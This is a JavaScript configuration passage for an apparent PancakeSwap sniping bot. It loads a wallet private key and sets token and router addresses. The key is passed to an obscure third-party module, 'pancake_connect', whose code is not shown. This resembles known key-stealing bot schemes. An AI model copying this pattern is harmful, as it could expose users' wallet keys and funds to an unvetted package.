/* IMPORTS */
const ethers = require('ethers');
const { ChainId, Token, TokenAmount, Fetcher, Pair, Route, Trade, TradeType, Percent } = require('@pancakeswap-libs/sdk');
const Web3 = require('web3');
const conn = require('pancake_connect');
const { JsonRpcProvider } = require('@ethersproject/providers');
const { ONE } = require('@pancakeswap-libs/sdk/dist/constants');
require("dotenv").config();

/* CONSTANTS */
const INPUT_TOKEN_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c" // Address of token for buying with i.e. WBNB
const OUTPUT_TOKEN_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c" // Address of token for outputing snipes with i.e. WBNB "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56" <-- BUSD 
const AMOUNT_USED_TO_BUY = ".3" // Amount of input token to buy with
const SLIPPAGE_AMT = "25" // Slippage for snipe in percent start high for new listing snipes
const PANCAKE_ROUTER = "0x10ed43c718714eb63d5aa57b78b54704e256024e" // MAINNET Pancakeswap Router address
const PANCAKE_FACTORY = "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73" // MAINNET Pancakeswap Factory address
const PRIVATE_KEY = process.env.PRIVATE_KEY

/* CONFIGS */
const PROVIDER = new JsonRpcProvider(process.env.MAINNET_RPC); // BSC MAINNET RPC URL
const web3 = new Web3(process.env.GETBLOCK_WS); // GETBLOCK API WSS FEED CURRENT RATE LIMIT 40k/24hr period
const { address: admin } = web3.eth.accounts.wallet.add(PRIVATE_KEY); // Create admin object to register wallet account
console.log(`---------- Configuration Complete ----------`)

/* SETUP FIELD CONSTANTS */
const inputTokenWeb3 = web3.utils.toChecksumAddress(INPUT_TOKEN_ADDRESS);
const outputTokenWeb3 = web3.utils.toChecksumAddress(OUTPUT_TOKEN_ADDRESS);
const amtToBuy = AMOUNT_USED_TO_BUY;
const slippage = SLIPPAGE_AMT;
const pancakeRouter = PANCAKE_ROUTER;
const ONE_ETH_IN_WEI = web3.utils.toBN(web3.utils.toWei('1'));
const tradeAmt = ONE_ETH_IN_WEI.div(web3.utils.toBN('300'));
const pvt_key = PRIVATE_KEY;
const tx_signer = conn.wallet(pvt_key, PROVIDER);
